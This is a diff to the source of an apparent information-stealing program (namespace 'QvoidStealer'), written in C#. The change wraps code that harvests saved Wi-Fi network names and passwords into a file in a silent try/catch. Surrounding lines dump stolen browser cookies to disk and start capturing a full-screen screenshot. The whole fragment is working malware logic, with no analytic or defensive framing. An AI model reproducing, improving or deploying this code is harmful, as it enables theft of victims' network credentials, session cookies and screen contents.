@@ -381,16 +381,20 @@ namespace QvoidStealer.Main
             if (Cookies != "------ Cookies ------")
                 File.WriteAllText(filesDir + "\\BrowserCookies.txt", Cookies);
 
-            WirelessLan lan = new WirelessLan();
-            if (lan.IsAvailable)
+            try
             {
-                string content = "";
-                foreach (var ssid in lan.SSIDs)
-                    content += $"{ssid.Profile.Name}:{ssid.Security.Key}{Environment.NewLine}";
+                WirelessLan lan = new WirelessLan();
+                if (lan.IsAvailable)
+                {
+                    string content = "";
+                    foreach (var ssid in lan.SSIDs)
+                        content += $"{ssid.Profile.Name}:{ssid.Security.Key}{Environment.NewLine}";
 
-                if (!string.IsNullOrEmpty(content))
-                    File.WriteAllText(filesDir + "\\Lan.txt", content);
+                    if (!string.IsNullOrEmpty(content))
+                        File.WriteAllText(filesDir + "\\Lan.txt", content);
+                }
             }
+            catch { }
 
             using (Bitmap bmp = new Bitmap(SystemInformation.VirtualScreen.Width, SystemInformation.VirtualScreen.Height))
             {
